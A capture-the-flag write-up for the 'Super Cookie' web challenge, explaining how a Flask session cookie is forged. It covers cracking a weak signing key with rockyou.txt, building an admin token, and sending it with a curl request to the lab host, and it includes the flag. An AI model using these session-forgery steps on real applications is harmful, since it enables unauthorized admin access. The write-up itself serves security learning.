# Super Cookie
* **Platform/Event:** InIt CTF (live session 2026-11-14)
* **Category:** Web (Flask session forgery, 100 pts)
* **Difficulty:** Medium
* **Flag:** `InIt{C00k1e_F0rg3ry_1s_Sup3r}`

## Objective
Access a restricted admin area on a Flask story archive (`http://172.198.60.104:3000`) by forging the signed session cookie. "The cookie is unsafe somewhere."

## Reconnaissance & Methodology
1. Tools used: `curl`, base64/itsdangerous inspection, a custom `rockyou.txt` cracking script (`flask-unsign` misbehaved locally).
2. `/robots.txt` leaked the hidden admin path: `/admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311`.
3. Visiting it dropped `session=...` → `{"role":"guest","username":"visitor"}` — **signed, not encrypted** (Flask default serializer, salt `cookie-session`, HMAC-SHA1).
4. Brute-forced the signing key against `rockyou.txt` with `URLSafeTimedSerializer`; hit after ~17k candidates → **`secret123`**.

## Solution & Exploitation
* Forge the client-authored claim: `s.dumps({"role":"admin","username":"admin"})` → `eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6ImFkbWluIn0.avhYSA.k1u5aftM1qhh3nG-Tr5NloWKhhg`.
* Final payload: `curl -s http://172.198.60.104:3000/admin/8f14e45f-ea9d-4b21-9c6d-62f8f7a6c311 -H "Cookie: session=<forged>"` → admin panel + `InIt{C00k1e_F0rg3ry_1s_Sup3r}`.
* Root cause: once the HMAC key is weak, the `role` claim is fully client-controlled.
